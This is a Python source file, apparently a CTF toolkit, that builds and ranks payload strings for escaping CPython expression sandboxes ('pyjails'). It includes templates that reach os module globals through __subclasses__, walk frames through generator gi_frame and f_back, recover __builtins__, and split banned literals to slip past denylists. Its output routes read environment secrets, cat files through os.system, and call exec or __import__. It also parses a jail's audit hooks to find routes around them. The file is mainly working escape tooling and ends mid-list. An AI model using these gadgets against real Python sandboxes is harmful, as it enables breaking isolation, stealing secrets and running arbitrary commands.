#!/usr/bin/env python3
"""Shared Python-jail escape gadget library (B-051).

A *gadget* here is a reusable object-graph primitive for a CPython expression jail: a template
string plus the structural features it needs (dunder access, subscripting, comprehensions, ...)
and whether the route it takes raises a sensitive audit event.  This module assembles candidate
payload **strings**; it never evaluates, execs, imports through, or otherwise detonates one.  A
caller sends an assembled string through a scoped transport and reads what comes back.

The catalogue is grounded in two solved CSCTF jails that shared the same primitives:

  * ``9143/warden`` -- static AST gate (import-only), empty ``__builtins__``, an audit hook that
    *permits* the ``object.__getattr__`` events raised while reading a function's ``__globals__``.
    Route: ``os._wrap_close`` is in ``object.__subclasses__()`` because ``os`` was imported before
    the jail sealed; ``_wrap_close.__init__.__globals__`` exposes ``environ`` and ``write``.
  * ``9124/fire-control`` -- blind jail, empty ``__builtins__``, substring denylist that bans
    ``class/base/mro/subclass/globals/builtins/getattr/open/read/...`` but *not* ``f_locals``.
    Route: a self-referential generator captures the running eval frame; ``f_back`` chains reach
    the jail module's ``f_locals`` (its globals); ``__builtins__`` is recovered by splitting the
    banned literal (``'__buil'+'tins__'``); output goes back over the discovered socket stream.

Both routes, plus builtins recovery and denylist-evasion, live here as composable builders so the
9124 and 9143 escapes (and any sibling jail) assemble from one vocabulary instead of from scratch.
"""
from __future__ import annotations

import argparse
import ast
import dataclasses
import json
import sys
from typing import Iterable, Sequence

MAX_NAME = 128
MAX_BANNED = 512
MAX_LITERAL = 4_096
MAX_DEPTH = 64


class GadgetError(ValueError):
    """Malformed request, or a bounded-assembly limit was reached.  Loud, never silent."""


# --------------------------------------------------------------------------- feature vocabulary
#
# Each feature a gadget *uses* is a token.  A jail's constraints ban some of these structurally
# (no dunders, no subscription, no comprehension, ...).  rank() filters on them.

FEATURES = (
    "attribute",      # any ``a.b`` access
    "dunder",         # a ``__x__`` attribute name appears in source
    "subscript",      # ``a[b]``
    "call",           # ``f(...)``
    "comprehension",  # ``[.. for .. in ..]`` / genexp
    "assignment",     # needs ``=`` (statement/walrus), i.e. not a single bare expression
    "string",         # a string literal appears
)


@dataclasses.dataclass(frozen=True)
class PyGadget:
    """One reusable jail primitive.

    ``template`` carries ``{...}`` placeholders a builder fills.  ``produces`` names what evaluating
    the template yields (``subclasses_list``, ``class``, ``module_globals``, ``builtins_map``,
    ``frame``, ``jail_globals``, ``output``).  ``audit_events`` lists the CPython audit events the
    route raises (measured on CPython 3.12: ``__subclasses__()``, ``__init__.__globals__``,
    ``f_back``, ``f_locals``, ``__dict__`` and ``os.write`` raise none; ``gi_frame`` raises
    ``object.__getattr__``; ``os.open``/``open`` raise ``open``; ``os.system`` raises ``os.system``;
    ``__import__`` raises ``import``; ``exec``/``compile`` of a string raise ``exec``/``compile``).
    ``audit_sensitive`` is derived: the route raises an event an audit-hooked jail conventionally
    blocks (:data:`COMMONLY_BLOCKED_EVENTS`).  The ``__globals__`` route raises none, which is why
    it survived warden's hook.
    """

    name: str
    category: str
    produces: str
    template: str
    uses: tuple[str, ...]
    audit_events: tuple[str, ...] = ()
    base_rank: int = 50
    notes: str = ""

    def feature_set(self) -> frozenset[str]:
        return frozenset(self.uses)

    @property
    def audit_sensitive(self) -> bool:
        return any(_commonly_blocked(event) for event in self.audit_events)


# Events an audit-hooked jail blocks when nothing better is known about its hook (``audit_hook=True``
# with no parsed :class:`AuditPolicy`).  Prefix entries end with ``.``.
COMMONLY_BLOCKED_EVENTS: tuple[str, ...] = (
    "open", "import", "exec", "compile", "os.system", "subprocess.Popen", "os.exec", "os.posix_spawn",
    "os.spawn", "os.fork", "os.startfile", "ctypes.", "pty.spawn", "socket.",
)


def _commonly_blocked(event: str) -> bool:
    for entry in COMMONLY_BLOCKED_EVENTS:
        if entry.endswith("."):
            if event.startswith(entry):
                return True
        elif event == entry or event.startswith(entry + "."):
            return True
    return False


# The curated gadget vocabulary.  Templates with no placeholder are complete expressions; the
# rest are filled by the builders below.
GADGETS: tuple[PyGadget, ...] = (
    PyGadget(
        "subclasses-enum", "subclasses", "subclasses_list",
        "().__class__.__base__.__subclasses__()",
        ("attribute", "dunder", "call"), base_rank=70,
        notes="enumerate every class loaded in the interpreter",
    ),
    PyGadget(
        "subclass-by-name", "subclasses", "class",
        "[{var} for {var} in ().__class__.__base__.__subclasses__() if {var}.__name__=={name!r}][0]",
        ("attribute", "dunder", "call", "comprehension", "subscript", "string"), base_rank=68,
        notes="pick a loaded class by __name__ (e.g. _wrap_close, catch_warnings)",
    ),
    PyGadget(
        "init-globals", "module_globals", "module_globals",
        "{class_expr}.__init__.__globals__",
        ("attribute", "dunder"), base_rank=66,
        notes="a bound method's __globals__ is its defining module's dict (os, subprocess, ...)",
    ),
    PyGadget(
        "func-globals", "module_globals", "module_globals",
        "{func_expr}.__globals__",
        ("attribute", "dunder"), base_rank=60,
        notes="reach a module dict through any function object already in scope",
    ),
    PyGadget(
        "catch-warnings-builtins", "builtins", "builtins_map",
        "[{var} for {var} in ().__class__.__base__.__subclasses__() "
        "if {var}.__name__=='catch_warnings'][0]()._module.__builtins__",
        ("attribute", "dunder", "call", "comprehension", "subscript", "string"), base_rank=58,
        notes="recover a real __builtins__ mapping through the loaded warnings helper",
    ),
    PyGadget(
        "frame-selfref", "frame", "frame",
        "[{var}:=({var}.gi_frame.f_back for {inner} in (1,)),(*{var},)[0]][1]",
        # gi_frame / f_back are plain attributes: no dunder, and ``(*g,)`` is not a call.
        ("attribute", "subscript", "comprehension", "assignment"),
        audit_events=("object.__getattr__",), base_rank=52,
        notes="single-expression variant of the 9124 self-referential genexp frame grab; "
              "evaluates to the frame that ran it (gi_frame raises object.__getattr__)",
    ),
    PyGadget(
        "frame-walk-locals", "frame", "jail_globals",
        "{frame_expr}{backs}.f_locals",
        ("attribute",), base_rank=54,
        notes="f_locals is often allowed where f_globals is denied; walk f_back to the jail module",
    ),
    PyGadget(
        "builtins-from-globals", "builtins", "builtins_map",
        "{globals_expr}[{key}]",
        ("subscript", "string"), base_rank=56,
        notes="pull __builtins__ out of a recovered globals mapping (split the literal to dodge bans)",
    ),
    # -- output routes: what to do once a module dict / builtins map is in hand ---------------
    PyGadget(
        "environ-write", "output", "output",
        "{globals_expr}[{write}](1,{globals_expr}[{environ}][{key}].encode())",
        ("attribute", "subscript", "call", "string"), base_rank=64,
        notes="the 9143 warden route: os.environ read + os.write to fd 1 -- raises no audit event",
    ),
    PyGadget(
        "os-open-read", "output", "output",
        "{globals_expr}[{read}]({globals_expr}[{open}]({path},0),4096)",
        ("subscript", "call", "string"), audit_events=("open",), base_rank=48,
        notes="os.open/os.read a file through the module dict; raises 'open'",
    ),
    PyGadget(
        "builtins-open-read", "output", "output",
        "{builtins_expr}[{open}]({path}).read()",
        ("attribute", "subscript", "call", "string"), audit_events=("open",), base_rank=46,
        notes="builtins open(); raises 'open'",
    ),
    PyGadget(
        "os-system-cat", "command", "output",
        "{globals_expr}[{system}]({cmd})",
        ("subscript", "call", "string"), audit_events=("os.system",), base_rank=42,
        notes="os.system through the module dict; output lands on the process stdout",
    ),
    PyGadget(
        "builtins-import-os", "command", "module",
        "{builtins_expr}[{import}]({mod})",
        ("subscript", "call", "string"), audit_events=("import",), base_rank=40,
        notes="__import__ from a recovered builtins map; raises 'import'",
    ),
    PyGadget(
        "builtins-exec", "command", "output",
        "{builtins_expr}[{exec}]({code})",
        ("subscript", "call", "string"), audit_events=("exec", "compile"), base_rank=38,
        notes="exec a source string; raises 'compile' and 'exec'",
    ),
)

_BY_NAME = {g.name: g for g in GADGETS}


# --------------------------------------------------------------------------- bounded helpers

def _check_name(name: str, *, label: str = "class name") -> str:
    if not isinstance(name, str) or not name:
        raise GadgetError(f"{label} must be a non-empty string")
    if len(name) > MAX_NAME:
        raise GadgetError(f"{label} exceeds {MAX_NAME} characters")
    return name


def _banned(values: Iterable[str] | None) -> tuple[str, ...]:
    if values is None:
        return ()
    out: list[str] = []
    for value in values:
        if not isinstance(value, str):
            raise GadgetError("banned substrings must be strings")
        if value:
            out.append(value)
        if len(out) > MAX_BANNED:
            raise GadgetError("too many banned substrings")
    return tuple(out)


# --------------------------------------------------------------------------- denylist evasion

def split_literal(value: str, banned: Sequence[str] = (), *, pieces: int | None = None) -> list[str]:
    """Split ``value`` into literal pieces so no banned substring survives in any single piece.

    The pieces concatenate (``''.join(parts)``) back to ``value`` exactly.  This is the
    ``'__buil'+'tins__'`` trick, generalised: it guarantees that for every banned token, no piece
    contains it, by cutting at least once *inside* each occurrence.  It never changes the string's
    value, only how its source is written.
    """
    if not isinstance(value, str) or not value:
        raise GadgetError("literal must be a non-empty string")
    if len(value) > MAX_LITERAL:
        raise GadgetError("literal exceeds assembly bound")
    banned = _banned(banned)
    cuts: set[int] = set()
    low = value.lower()
    for token in banned:
        tok = token.lower()
        if not tok:
            continue
        start = 0
        while True:
            hit = low.find(tok, start)
            if hit < 0:
                break
            # Cut one character in from the occurrence's start so the token cannot stay whole.
            cut = hit + 1
            if cut < len(value):
                cuts.add(cut)
            else:
                cuts.add(hit)  # token ends the string; cut before its last char
            start = hit + 1
    if pieces is not None:
        if not isinstance(pieces, int) or isinstance(pieces, bool) or pieces < 1:
            raise GadgetError("pieces must be a positive integer")
        if pieces > len(value):
            raise GadgetError("cannot split into more pieces than characters")
        step = max(1, len(value) // pieces)
        for index in range(step, len(value), step):
            cuts.add(index)
            if len([c for c in cuts if 0 < c < len(value)]) >= pieces - 1:
                break
    ordered = sorted(c for c in cuts if 0 < c < len(value))
    parts: list[str] = []
    prev = 0
    for cut in ordered:
        parts.append(value[prev:cut])
        prev = cut
    parts.append(value[prev:])
    # Verify the invariant we promised rather than trusting the arithmetic.
    if "".join(parts) != value:
        raise GadgetError("internal split invariant violated")
    for token in banned:
        tok = token.lower()
        if tok and any(tok in part.lower() for part in parts):
            raise GadgetError(f"could not evade banned substring {token!r}")
    return parts


def literal_expr(value: str, banned: Sequence[str] = ()) -> str:
    """Render a Python source expression that evaluates to ``value`` and contains no banned token."""
    parts = split_literal(value, banned)
    return "+".join(repr(part) for part in parts)


# --------------------------------------------------------------------------- route builders

def subclasses_enum() -> str:
    """The subclasses enumeration primitive (9143 recon step)."""
    return _BY_NAME["subclasses-enum"].template


def select_class(name: str, *, banned: Sequence[str] = (), var: str = "c") -> str:
    """``[c for c in <subclasses> if c.__name__=="NAME"][0]`` with the name literal ban-evaded."""
    name = _check_name(name)
    banned = _banned(banned)
    var = _check_name(var, label="loop variable")
    name_lit = literal_expr(name, banned)
    return (
        f"[{var} for {var} in ().__class__.__base__.__subclasses__() "
        f"if {var}.__name__=={name_lit}][0]"
    )


def module_globals(class_expr: str) -> str:
    """``<class_expr>.__init__.__globals__`` -- the defining module's dict (os, subprocess, ...)."""
    if not isinstance(class_expr, str) or not class_expr:
        raise GadgetError("class_expr must be a non-empty expression string")
    if len(class_expr) > MAX_LITERAL:
        raise GadgetError("class_expr exceeds assembly bound")
    return f"{class_expr}.__init__.__globals__"


def read_env_and_write(name: str, env_key: str = "FLAG", *, fd: int = 1,
                       banned: Sequence[str] = (), marker: bytes = b"") -> str:
    """Assemble the warden one-liner: find class ``name``, read ``environ[env_key]``, write it back.

    With ``marker`` set the value is wrapped ``marker + value + marker`` so an interactive driver
    can recover it from a noisy stream.  ``fd`` is the file descriptor to write to (1 = stdout,
    which on these jails is the player's own socket).
    """
    name = _check_name(name)
    env_key = _check_name(env_key, label="environment key")
    if not isinstance(fd, int) or isinstance(fd, bool) or not 0 <= fd <= 1024:
        raise GadgetError("fd must be a small non-negative integer")
    if not isinstance(marker, (bytes, bytearray)) or len(marker) > MAX_NAME:
        raise GadgetError("marker must be short bytes")
    banned = _banned(banned)
    g = module_globals(select_class(name, banned=banned))
    env_lit = literal_expr(env_key, banned)
    write_key = literal_expr("write", banned)
    env_name = literal_expr("environ", banned)
    value = f'x[{env_name}][{env_lit}].encode()'
    if marker:
        value = f"{marker!r}+{value}+{marker!r}"
    return f'x={g};x[{write_key}]({fd},{value})'


def read_env_via_system(name: str, path: str = "/flag", *, banned: Sequence[str] = ()) -> str:
    """Assemble a ``system('cat <path>')`` route through a module dict (output on process stdout)."""
    name = _check_name(name)
    path = _check_name(path, label="path")
    banned = _banned(banned)
    g = module_globals(select_class(name, banned=banned))
    sys_key = literal_expr("system", banned)
    cmd = literal_expr(f"cat {path}", banned)
    return f"x={g};x[{sys_key}]({cmd})"


def builtins_from_globals(globals_expr: str, *, banned: Sequence[str] = ()) -> str:
    """``G['__builtins__']`` with the key literal ban-evaded (the 9124 builtins recovery step)."""
    if not isinstance(globals_expr, str) or not globals_expr:
        raise GadgetError("globals_expr must be a non-empty expression string")
    banned = _banned(banned)
    key = literal_expr("__builtins__", banned)
    return f"{globals_expr}[{key}]"


def frame_walk_locals(backs: int) -> str:
    """The 9124 frame grab + ``f_back*backs.f_locals`` walk to the jail module's globals.

    Uses a self-referential generator so one evaluated expression yields the running eval frame,
    then walks ``f_back`` ``backs`` times and reads ``f_locals`` (allowed where ``f_globals`` is
    denied).  Emitted as two statements joined by ``;`` for an ``exec``-style jail.
    """
    if not isinstance(backs, int) or isinstance(backs, bool) or not 0 <= backs <= MAX_DEPTH:
        raise GadgetError(f"backs must be in 0..{MAX_DEPTH}")
    chain = ".f_back" * backs
    return (
        "g=(g.gi_frame.f_back for _ in (1,));F=(*g,)[0];"
        f"J=F{chain}.f_locals"
    )


# --------------------------------------------------------------------------- audit-hook parser
#
# A jail's ``sys.addaudithook`` hook decides which routes survive.  The parser reads the jail's
# source as DATA (``ast.parse`` only: nothing is compiled to bytecode, executed or imported) and
# reduces each registered hook to deny/allow matchers over the event name.  Anything it cannot
# reduce is recorded as an ``unknown`` reason, so a verdict is True (blocked), False (passes) or
# None (cannot tell) -- never a guess.

_EXIT_CALLS = frozenset({"exit", "_exit", "abort", "kill", "throw", "quit"})


@dataclasses.dataclass(frozen=True)
class EventMatcher:
    """Matches an audit event name: exact names, ``startswith`` prefixes, substring ``in`` tests."""

    exact: frozenset[str] = frozenset()
    prefixes: tuple[str, ...] = ()
    contains: tuple[str, ...] = ()

    def matches(self, event: str) -> bool:
        return (event in self.exact or any(event.startswith(p) for p in self.prefixes)
                or any(c in event for c in self.contains))

    def as_dict(self) -> dict:
        return {"exact": sorted(self.exact), "prefixes": list(self.prefixes),
                "contains": list(self.contains)}


@dataclasses.dataclass(frozen=True)
class AuditPolicy:
    """What a jail's audit hook(s) do to an event name, as far as static analysis can tell.

    ``deny`` matchers block what they match.  ``allow`` is ``None`` when no hook raises by default;
    otherwise the hook raises on every event that no ``allow`` matcher passes (allowlist).
    ``unknown`` lists the hook logic the parser could not reduce.
    """

    hooks: tuple[str, ...] = ()
    deny: tuple[EventMatcher, ...] = ()
    allow: tuple[EventMatcher, ...] | None = None
    unknown: tuple[str, ...] = ()

    def blocks(self, event: str) -> bool | None:
        if not isinstance(event, str) or not event:
            raise GadgetError("audit event must be a non-empty string")
        if not self.hooks:
            return False
        if any(m.matches(event) for m in self.deny):
            return True
        if self.allow is not None and not any(m.matches(event) for m in self.allow):
            return True
        if self.unknown:
            return None
        return False

    def as_dict(self) -> dict:
        return {
            "hooks": list(self.hooks),
            "deny": [m.as_dict() for m in self.deny],
            "allow": None if self.allow is None else [m.as_dict() for m in self.allow],
            "unknown": list(self.unknown),
        }


def _str_collection(node: ast.AST, consts: dict[str, ast.AST], depth: int = 0) -> frozenset[str] | None:
    """A literal collection of strings (set/list/tuple, frozenset()/set() of one, or a Name bound to one)."""
    if depth > 4:
        return None
    if isinstance(node, ast.Name) and node.id in consts:
        return _str_collection(consts[node.id], consts, depth + 1)
    if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) \
            and node.func.id in {"frozenset", "set", "tuple", "list"} and len(node.args) == 1:
        return _str_collection(node.args[0], consts, depth + 1)
    if isinstance(node, (ast.Set, ast.List, ast.Tuple)):
        out = []
        for elt in node.elts:
            if not (isinstance(elt, ast.Constant) and isinstance(elt.value, str)):
                return None
            out.append(elt.value)
        return frozenset(out)
    if isinstance(node, ast.Dict):  # ``if event in {"open": 1, ...}`` tests the keys
        keys = [k for k in node.keys if isinstance(k, ast.Constant) and isinstance(k.value, str)]
        if len(keys) != len(node.keys):
            return None
        return frozenset(k.value for k in keys)
    return None


def _is_event(node: ast.AST, ev: str) -> bool:
    return isinstance(node, ast.Name) and node.id == ev


def _event_cond(test: ast.AST, ev: str, consts: dict) -> tuple[bool, EventMatcher] | None:
    """Reduce an ``if`` test over the event name to (positive, matcher), or None if it is not one."""
    if isinstance(test, ast.UnaryOp) and isinstance(test.op, ast.Not):
        inner = _event_cond(test.operand, ev, consts)
        return None if inner is None else (not inner[0], inner[1])
    if isinstance(test, ast.BoolOp) and isinstance(test.op, ast.Or):
        parts = [_event_cond(v, ev, consts) for v in test.values]
        if any(p is None for p in parts) or len({p[0] for p in parts}) != 1:
            return None
        if not parts[0][0]:
            return None  # ``not A or not B`` == ``not (A and B)``: not a plain union
        return True, EventMatcher(
            exact=frozenset().union(*(p[1].exact for p in parts)),
            prefixes=tuple(x for p in parts for x in p[1].prefixes),
            contains=tuple(x for p in parts for x in p[1].contains))
    if isinstance(test, ast.Compare) and len(test.ops) == 1:
        op, left, right = test.ops[0], test.left, test.comparators[0]
        if _is_event(left, ev) and isinstance(op, (ast.In, ast.NotIn)):
            coll = _str_collection(right, consts)
            if coll is None:
                return None
            return isinstance(op, ast.In), EventMatcher(exact=coll)
        if isinstance(op, (ast.Eq, ast.NotEq)):
            other = right if _is_event(left, ev) else left if _is_event(right, ev) else None
            if isinstance(other, ast.Constant) and isinstance(other.value, str):
                return isinstance(op, ast.Eq), EventMatcher(exact=frozenset({other.value}))
            return None
        if _is_event(right, ev) and isinstance(op, (ast.In, ast.NotIn)) \
                and isinstance(left, ast.Constant) and isinstance(left.value, str):
            return isinstance(op, ast.In), EventMatcher(contains=(left.value,))
        return None
    if isinstance(test, ast.Call) and isinstance(test.func, ast.Attribute) \
            and test.func.attr == "startswith" and _is_event(test.func.value, ev) and len(test.args) == 1:
        arg = test.args[0]
        if isinstance(arg, ast.Constant) and isinstance(arg.value, str):
            return True, EventMatcher(prefixes=(arg.value,))
        coll = _str_collection(arg, consts)
        if coll is not None:
            return True, EventMatcher(prefixes=tuple(sorted(coll)))
    return None


def _call_name(node: ast.AST) -> str | None:
    if isinstance(node, ast.Call):
        func = node.func
        if isinstance(func, ast.Name):
            return func.id
        if isinstance(func, ast.Attribute):
            return func.attr
    return None


def _terminal(stmts: Sequence[ast.stmt], raisers: frozenset[str]) -> str | None:
    """'raise' / 'return' if a top-level statement of the block ends the hook that way."""
    for stmt in stmts:
        if isinstance(stmt, ast.Raise):
            return "raise"
        if isinstance(stmt, ast.Expr) and (_call_name(stmt.value) in _EXIT_CALLS
                                           or _call_name(stmt.value) in raisers):
            return "raise"
        if isinstance(stmt, ast.Return):
            return "return"
    return None


def _expr_raises(node: ast.AST, raisers: frozenset[str]) -> bool:
    return any(_call_name(sub) in _EXIT_CALLS or _call_name(sub) in raisers for sub in ast.walk(node))


def _analyse_hook(name: str, ev: str, body: Sequence[ast.stmt], consts: dict, raisers: frozenset[str],
                  deny: list, allow: list, unknown: list) -> bool:
    """Walk one hook body in order.  Returns True when the hook raises by default (allowlist)."""
    passed: list[EventMatcher] = []          # events let through by an early ``return``
    narrowed: list[EventMatcher] = []        # ``if event not in X: return`` -> later rules apply to X
    for stmt in body:
        if isinstance(stmt, ast.If):
            cond = _event_cond(stmt.test, ev, consts)
            then_t = _terminal(stmt.body, raisers)
            else_t = _terminal(stmt.orelse, raisers)
            if cond is None:
                if then_t == "raise" or else_t == "raise":
                    unknown.append(f"{name}: raises under a condition the parser cannot reduce "
                                   f"(line {stmt.lineno})")
                continue
            positive, matcher = cond
            if then_t == "raise":
                if positive:
                    deny.append(matcher)
                else:
                    allow.append(matcher)
                    return True
            elif then_t == "return":
                if positive:
                    passed.append(matcher)
                else:
                    narrowed.append(matcher)
            if else_t == "raise":
                if positive:
                    allow.append(matcher)
                    return True
                deny.append(matcher)
        elif isinstance(stmt, ast.Raise) or (
                isinstance(stmt, ast.Expr) and _expr_raises(stmt.value, raisers)):
            if narrowed:
                deny.extend(narrowed)
                return False
            allow.extend(passed)
            return True
        elif isinstance(stmt, ast.Return):
            return False
        elif isinstance(stmt, (ast.Try, ast.With, ast.For, ast.While, ast.Match)):
            if any(isinstance(sub, ast.Raise) for sub in ast.walk(stmt)):
                unknown.append(f"{name}: raises inside a {type(stmt).__name__} block (line {stmt.lineno})")
    return False


def parse_audit_hooks(source: str) -> AuditPolicy:
    """Statically reduce the ``sys.addaudithook`` hooks in jail ``source`` to an :class:`AuditPolicy`.

    ``source`` is jail code read as text; it is parsed with :func:`ast.parse` and never executed.
    """
    if not isinstance(source, str):
        raise GadgetError("jail source must be text")
    if len(source) > 4 * 1024 * 1024:
        raise GadgetError("jail source exceeds the parse bound")
    try:
        tree = ast.parse(source)
    except SyntaxError as exc:
        raise GadgetError(f"jail source does not parse: {exc.msg} (line {exc.lineno})") from None

    consts: dict[str, ast.AST] = {}
    functions: dict[str, ast.FunctionDef] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and len(node.targets) == 1 and isinstance(node.targets[0], ast.Name):
            consts[node.targets[0].id] = node.value
        elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            functions[node.name] = node
    raisers = frozenset(name for name, fn in functions.items()
                        if any(isinstance(stmt, ast.Raise) for stmt in fn.body))

    hooks: list[str] = []
    deny: list[EventMatcher] = []
    allow: list[EventMatcher] = []
    allowlisted = False
    unknown: list[str] = []
    for node in ast.walk(tree):
        if not (isinstance(node, ast.Call) and _call_name(node) == "addaudithook" and node.args):
            continue
        target = node.args[0]
        if isinstance(target, ast.Name) and target.id in functions:
            fn = functions[target.id]
            hooks.append(fn.name)
            params = fn.args.posonlyargs + fn.args.args
            if not params:
                unknown.append(f"{fn.name}: hook takes no event parameter")
                continue
            allowlisted |= _analyse_hook(fn.name, params[0].arg, fn.body, consts, raisers,
                                         deny, allow, unknown)
        elif isinstance(target, ast.Lambda):
            hooks.append(f"<lambda line {node.lineno}>")
            params = target.args.posonlyargs + target.args.args
            body = target.body
            if not params or not isinstance(body, ast.IfExp):
                unknown.append(f"<lambda line {node.lineno}>: body is not a reducible conditional")
                continue
            cond = _event_cond(body.test, params[0].arg, consts)
            then_r, else_r = _expr_raises(body.body, raisers), _expr_raises(body.orelse, raisers)
            if cond is None:
                if then_r or else_r:
                    unknown.append(f"<lambda line {node.lineno}>: condition not reducible")
                continue
            positive, matcher = cond
            if then_r and not else_r:
                (deny if positive else allow).append(matcher)
                allowlisted |= not positive
            elif else_r and not then_r:
                (allow if positive else deny).append(matcher)
                allowlisted |= positive
        else:
            label = target.id if isinstance(target, ast.Name) else type(target).__name__
            hooks.append(label)
            unknown.append(f"{label}: hook body not found in the source")
    return AuditPolicy(hooks=tuple(hooks), deny=tuple(deny),
                       allow=tuple(allow) if allowlisted else None, unknown=tuple(unknown))


# --------------------------------------------------------------------------- ranking

@dataclasses.dataclass(frozen=True)
class JailProfile:
    """What is known about a jail's restrictions, used only to rank gadgets (never to run them).

    ``audit_policy`` (from :func:`parse_audit_hooks`) is precise: a gadget is blocked iff the policy
    blocks one of its audit events.  Without it, ``audit_hook=True`` falls back to the conventional
    sensitive-event set (:data:`COMMONLY_BLOCKED_EVENTS`).
    """

    banned_features: frozenset[str] = frozenset()
    banned_substrings: tuple[str, ...] = ()
    audit_hook: bool = False
    subclasses_blocked: bool = False      # class/base/mro/subclass route denied outright
    audit_policy: AuditPolicy | None = None

    def validate(self) -> "JailProfile":
        bad = self.banned_features - frozenset(FEATURES)
        if bad:
            raise GadgetError(f"unknown banned features: {sorted(bad)}")
        _banned(self.banned_substrings)
        if self.audit_policy is not None and not isinstance(self.audit_policy, AuditPolicy):
            raise GadgetError("audit_policy must be an AuditPolicy")
        return self


_STRUCTURAL = ("banned features", "subclasses route", "blocked audit event")


def _gadget_blocked(gadget: PyGadget, profile: JailProfile) -> list[str]:
    reasons: list[str] = []
    used = gadget.feature_set() & profile.banned_features
    if used:
        reasons.append("uses banned features: " + ", ".join(sorted(used)))
    present = [tok for tok in profile.banned_substrings if tok and tok.lower() in gadget.template.lower()]
    if present:
        reasons.append("template contains banned substrings: " + ", ".join(repr(t) for t in present))
    if profile.subclasses_blocked and gadget.category in {"subclasses", "module_globals", "builtins"} \
            and gadget.category != "frame":
        if "subclasses" in gadget.template:
            reasons.append("subclasses route is blocked on this jail")
    policy = profile.audit_policy
    if policy is not None:
        verdicts = {event: policy.blocks(event) for event in gadget.audit_events}
        blocked = [event for event, verdict in verdicts.items() if verdict is True]
        unsure = [event for event, verdict in verdicts.items() if verdict is None]
        if blocked:
            reasons.append("route raises a blocked audit event: " + ", ".join(blocked))
        elif unsure:
            reasons.append("audit hook verdict unknown for: " + ", ".join(unsure))
    elif profile.audit_hook and gadget.audit_sensitive:
        reasons.append("route raises a blocked audit event (conventional set; hook not parsed): "
                       + ", ".join(e for e in gadget.audit_events if _commonly_blocked(e)))
    return reasons


def rank(profile: JailProfile, *, include_blocked: bool = True) -> list[dict]:
    """Rank the gadget vocabulary for a jail profile; blocked gadgets optionally follow as diagnostics.

    Substring bans are assessed against each template's *literal* source; a builder may still evade
    them with :func:`split_literal`, so a substring hit is a warning-weighted penalty, not a hard
    structural block the way a banned feature is.
    """
    profile = profile.validate()
    rows: list[dict] = []
    for gadget in GADGETS:
        reasons = _gadget_blocked(gadget, profile)
        n_structural = sum(1 for r in reasons if any(s in r for s in _STRUCTURAL))
        score = (gadget.base_rank - 25 * n_structural
                 - 8 * sum(1 for r in reasons if "banned substrings" in r)
                 - 10 * sum(1 for r in reasons if "verdict unknown" in r))
        rows.append({
            "name": gadget.name,
            "category": gadget.category,
            "produces": gadget.produces,
            "template": gadget.template,
            "uses": list(gadget.uses),
            "audit_events": list(gadget.audit_events),
            "audit_sensitive": gadget.audit_sensitive,
            "usable": n_structural == 0,
            "reasons": reasons,
            "notes": gadget.notes,
            "score": max(0, score),
        })
    if not include_blocked:
        rows = [row for row in rows if row["usable"]]
    rows.sort(key=lambda row: (not row["usable"], -row["score"], row["name"]))
    return rows


def render(rows: Iterable[dict]) -> str:
    lines = ["Pyjail gadget vocabulary (assembly only; nothing was executed):"]
    for index, row in enumerate(rows, 1):
        state = "usable" if row["usable"] else "blocked"
        lines.append(f"[{index}] {row['name']} ({row['score']}, {state}) -> {row['produces']}")
        lines.append(f"    {row['template']}")
        if row["reasons"]:
            lines.append("    reasons: " + "; ".join(row["reasons"]))
        if row["notes"]:
            lines.append(f"    notes: {row['notes']}")
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------- CLI (offline only)

class _ArgumentParser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover - exercised via main()
        raise GadgetError(message)


def _policy_from_file(path: str) -> AuditPolicy:
    """Read jail source as text (data, never executed) and parse its audit hooks."""
    try:
        with open(path, "rb") as fh:
            raw = fh.read(4 * 1024 * 1024 + 1)
    except OSError as exc:
        raise GadgetError(f"cannot read jail source {path!r}: {exc.strerror}") from None
    return parse_audit_hooks(raw.decode("utf-8", "replace"))


def main(argv: list[str] | None = None) -> int:
    parser = _ArgumentParser(description="assemble/rank offline pyjail escape gadgets (no execution)")
    sub = parser.add_subparsers(dest="cmd", required=True)

    p_rank = sub.add_parser("rank", help="rank the gadget vocabulary for a jail profile")
    p_rank.add_argument("--ban-feature", action="append", default=[], choices=FEATURES)
    p_rank.add_argument("--ban-substr", action="append", default=[])
    p_rank.add_argument("--audit-hook", action="store_true")
    p_rank.add_argument("--subclasses-blocked", action="store_true")
    p_rank.add_argument("--jail-source", metavar="FILE",
                        help="jail source read as text; its audit hooks are parsed (never executed)")
    p_rank.add_argument("--only-usable", action="store_true")
    p_rank.add_argument("--json", action="store_true")

    p_audit = sub.add_parser("audit", help="parse a jail's sys.addaudithook hooks (source read as data)")
    p_audit.add_argument("jail_source", metavar="FILE")
    p_audit.add_argument("--event", action="append", default=[],
                         help="also print the verdict for this audit event (repeatable)")

    p_env = sub.add_parser("warden", help="assemble the environ-read + write-back one-liner")
    p_env.add_argument("--class-name", default="_wrap_close")
    p_env.add_argument("--env-key", default="FLAG")
    p_env.add_argument("--fd", type=int, default=1)
    p_env.add_argument("--ban-substr", action="append", default=[])
    p_env.add_argument("--marker", default="")

    p_frame = sub.add_parser("frame", help="assemble the self-referential frame-walk escape")
    p_frame.add_argument("--backs", type=int, default=3)

    try:
        args = parser.parse_args(argv)
        if args.cmd == "rank":
            profile = JailProfile(
                banned_features=frozenset(args.ban_feature),
                banned_substrings=tuple(args.ban_substr),
                audit_hook=args.audit_hook,
                subclasses_blocked=args.subclasses_blocked,
                audit_policy=_policy_from_file(args.jail_source) if args.jail_source else None,
            )
            rows = rank(profile, include_blocked=not args.only_usable)
            if args.json:
                print(json.dumps(rows, indent=2))
            else:
                sys.stdout.write(render(rows))
        elif args.cmd == "warden":
            marker = args.marker.encode() if args.marker else b""
            print(read_env_and_write(args.class_name, args.env_key, fd=args.fd,
                                     banned=tuple(args.ban_substr), marker=marker))
        elif args.cmd == "frame":
            print(frame_walk_locals(args.backs))
        elif args.cmd == "audit":
            policy = _policy_from_file(args.jail_source)
            out = policy.as_dict()
            out["verdicts"] = {event: policy.blocks(event) for event in args.event}
            print(json.dumps(out, indent=2))
        return 0
    except GadgetError as exc:
        print(f"pyjail_gadgets: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())


__all__ = [
    "GadgetError",
    "PyGadget",
    "GADGETS",
    "JailProfile",
    "FEATURES",
    "COMMONLY_BLOCKED_EVENTS",
    "EventMatcher",
